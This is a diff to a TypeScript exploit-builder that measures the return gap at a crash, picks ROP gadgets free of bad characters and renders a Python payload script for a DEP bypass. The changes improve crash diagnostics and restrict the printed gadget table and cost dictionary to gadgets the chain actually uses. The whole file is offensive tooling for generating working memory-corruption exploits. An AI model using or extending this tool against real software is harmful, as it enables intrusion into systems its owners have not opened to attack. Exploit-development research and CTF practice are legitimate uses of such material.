@@ -31,20 +31,39 @@ type Op = { call: Entry; values: Dword[]; times?: number; note?: string } | { li
  * `ret 4` makes it 4: the chain's second dword sits one dword further on. */
 export type Landing = { gap: number; how: string };
 
+/** The gap as [6/7] prints it: `line` says what the crash showed and `advice` what to do about it, and
+ * the advice is only ever something the reader can still do from here. */
+export type LandingRead = Landing & { measured: boolean; line: string; advice: string };
+
+const RET_N = "If the function the overflow returns from ends in ret N, set RET_GAP = N.";
+
 /** Reads the gap at the crash: the dword EIP was popped from is still on the stack just below ESP, so its
- * distance from ESP is the gap. Undefined gap when the stack cannot show it, with the reason. */
-export function measureLanding(eip: number | undefined, esp: number | undefined, read: (address: number) => number | undefined): Landing & { measured: boolean } {
-  const assumed = (why: string): Landing & { measured: boolean } => ({ gap: 0, measured: false, how: `not measured, ${why}: assumed 0, a plain ret` });
-  if (eip === undefined || esp === undefined) return assumed("no registers to read");
+ * distance from ESP is the gap. A crash with EIP inside a module was no ret at all, so there is no gap
+ * to read from it, and the reason says that instead of describing a return that never ran. */
+export function measureLanding(eip: number | undefined, esp: number | undefined, read: (address: number) => number | undefined, eipModule?: string): LandingRead {
+  const assumed = (why: string, advice: string, line?: string): LandingRead => {
+    const how = `not measured, ${why}: assumed 0, a plain ret`;
+    return { gap: 0, measured: false, how, line: line ?? `ESP after the crashing ret: ${how}.`, advice };
+  };
+  if (eip === undefined || esp === undefined) return assumed("no registers to read", "Run dep_plan at the crash, where the registers hold it.");
+  // Checked before the stack: a call just before the faulting instruction leaves its return address,
+  // which is that EIP, below ESP, and reading it as the popped dword would measure a ret that never ran.
+  if (eipModule !== undefined) return assumed(`the crash is a fault in ${eipModule}, not a ret`, RET_N,
+    `No return gap to read: EIP ${hex32(eip)} faulted inside ${eipModule}, so no ret ran. RET_GAP is assumed 0, a plain ret.`);
   const at = (offset: number): number | undefined => read((esp + offset) >>> 0);
-  if (at(0) === eip) return assumed(`the dword at ESP is EIP ${hex32(eip)} too`);
+  const repeats = "The crash input repeats that dword: crash it with a different one after EIP, or set RET_GAP to the N of the function's ret N.";
+  if (at(0) === eip) return assumed(`the dword at ESP is EIP ${hex32(eip)} too`, repeats);
   for (let below = 4; below <= 0x100; below += 4) {
     if (at(-below) !== eip) continue;
-    if (at(-below - 4) === eip) return assumed(`EIP ${hex32(eip)} repeats below ESP`);
+    if (at(-below - 4) === eip) return assumed(`EIP ${hex32(eip)} repeats below ESP`, repeats);
     const gap = below - 4;
-    return { gap, measured: true, how: `EIP ${hex32(eip)} sits at ESP-${below.toString(16).toUpperCase()}, so the ret moved ESP ${gap} byte${gap === 1 ? "" : "s"} past it (dds esp-${below.toString(16)} L2)` };
+    const how = `EIP ${hex32(eip)} sits at ESP-${below.toString(16).toUpperCase()}, so the ret moved ESP ${gap} byte${gap === 1 ? "" : "s"} past it (dds esp-${below.toString(16)} L2)`;
+    return {
+      gap, measured: true, how, line: `ESP after the crashing ret: ${how}.`,
+      advice: gap === 0 ? "The chain's second dword sits right after EIP." : `The chain's second dword sits at OFFSET + ${4 + gap}: RET_GAP puts ${gap} junk bytes after the first gadget.`,
+    };
   }
-  return assumed(`EIP ${hex32(eip)} is not on the stack below ESP`);
+  return assumed(`EIP ${hex32(eip)} is not on the stack below ESP, so no ret popped it`, RET_N);
 }
 
 /** A junk dword and the fill byte the payload pads with, both free of the bad chars. */
@@ -964,10 +983,14 @@ export function buildExploit(input: BuildInput): Build {
   }
 
   assignNames(table);
-  const resolve = (text: string): string => text.replace(/\u0001(\d+)\u0001/g, (_, i: string) => refs[Number(i)].name);
+  const TOKEN = /\u0001(\d+)\u0001/g;
+  const resolve = (text: string): string => text.replace(TOKEN, (_, i: string) => refs[Number(i)].name);
   // The one place a dword becomes chain text, so the bad char check cannot be skipped by a new constant:
   // a known value holding a bad byte is a hole that stops the file and names it, never a dword sent.
+  // A gadget sent as a value, such as `c.rop(POP_EDI, RET)`, is read by the file without being called.
+  const sent = new Set<number>();
   const dword = (value: Dword): string => {
+    for (const match of value.text.matchAll(TOKEN)) sent.add(refs[Number(match[1])].address);
     if (value.k === undefined || isClean(value.k, badchars)) return resolve(value.text);
     const name = `${resolve(value.text)} = ${hex(value.k)}`;
     holes.push(`${name}: holds a bad byte, and no route here builds it`);
@@ -983,8 +1006,6 @@ export function buildExploit(input: BuildInput): Build {
   });
   const loaderLines = render(loaders, "    ").map((line) => line.indexOf("    def ") === 0 ? line.slice(4) : line);
 
-  const width = Math.max(0, ...table.map((entry) => entry.name.length));
-  const cost = table.filter((entry) => entry.pops > 0 || entry.retn > 0);
   const badText = badchars.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
   // PUSHAD takes dwSize as a constant in a register; both styles that write the frame take it from the
   // script, which grows it until its negative holds no bad char.
@@ -1003,6 +1024,12 @@ export function buildExploit(input: BuildInput): Build {
       "return sendable(payload)",
     ].map((line) => (line === "" ? "" : `    ${line}`)),
   ];
+  // The block names what the chain calls or sends and nothing else, so it is read after the last render. A
+  // route the search tried and dropped leaves its gadget in the table, and it is no swap: using it means
+  // another loader, not moving a comment marker. The [4/7] ranking still shows it, without the >.
+  const used = table.filter((entry) => called.has(entry.address) || sent.has(entry.address));
+  const width = Math.max(0, ...used.map((entry) => entry.name.length));
+  const cost = used.filter((entry) => entry.pops > 0 || entry.retn > 0);
   return {
     table,
     stages,
@@ -1014,7 +1041,7 @@ export function buildExploit(input: BuildInput): Build {
       2: slot.block,
       3: CORPUS_BLOCK,
       4: { lines: [
-        ...table.flatMap((entry) => [
+        ...used.flatMap((entry) => [
           `${entry.name.padEnd(width)} = ${hex(entry.address)}   # ${entry.sequence}${warnings[entry.address] ? `   <<< ${warnings[entry.address]}`
             : byAddress[entry.address] && far(byAddress[entry.address]) ? `   <<< takes 0x${(stackMove(byAddress[entry.address]) ?? 0).toString(16)} bytes of stack: c.rop pads that much junk into the payload` : ""}`,
           ...swapsFor(entry.address, entry.loads).map((swap) =>
@@ -1023,9 +1050,9 @@ export function buildExploit(input: BuildInput): Build {
         "# (the stack dwords each one takes, ret N). The swap-ins are here too, so swapping one in needs no other edit.",
         ...dictLines("COST", [
           ...cost.map((entry) => `${entry.name}: (${entry.pops}, ${entry.retn ? `0x${entry.retn.toString(16)}` : 0})`),
-          ...table.flatMap((entry) => swapsFor(entry.address, entry.loads))
+          ...used.flatMap((entry) => swapsFor(entry.address, entry.loads))
             .filter((swap, i, all) => (swap.pops > 0 || swap.retn > 0)
-              && table.every((entry) => entry.address !== swap.address)
+              && used.every((entry) => entry.address !== swap.address)
               && all.findIndex((other) => other.address === swap.address) === i)
             .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`),
         ]),
